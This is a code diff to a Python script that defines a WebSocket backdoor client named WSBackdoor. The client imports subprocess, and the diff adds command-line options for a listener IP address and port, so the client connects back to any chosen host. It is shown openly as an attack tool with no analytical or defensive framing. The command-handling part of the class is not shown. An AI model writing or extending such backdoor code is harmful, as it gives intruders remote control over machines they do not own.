@@ -1,6 +1,7 @@
 # -*- coding: utf-8 -*-
 from ws4py.client.threadedclient import WebSocketClient
 import subprocess
+import optparse
 
 class WSBackdoor(WebSocketClient):
     
@@ -25,8 +26,22 @@ class WSBackdoor(WebSocketClient):
 
 
 if __name__ == '__main__':
+    usage = __doc__
+    version= "0.01"
+    parser = optparse.OptionParser(usage, None, optparse.Option, version)
+    parser.add_option('-p',
+                      '--port',
+                      default='9002',
+                      dest='port',
+                      help='Listener Port')
+    parser.add_option('-l',
+                      '--listen',
+                      default='127.0.0.1',
+                      dest='ip',
+                      help='Listener IP address')
+    (options, args) = parser.parse_args()
     try:
-        ws = WSBackdoor('http://localhost:9002/endpoint/boxes/box1', protocols=['http-only', 'chat'])
+        ws = WSBackdoor('http://'+options.ip+':'+options.port+'/endpoint/boxes/box1', protocols=['http-only', 'chat'])
         ws.connect()
     except KeyboardInterrupt:
         ws.close()
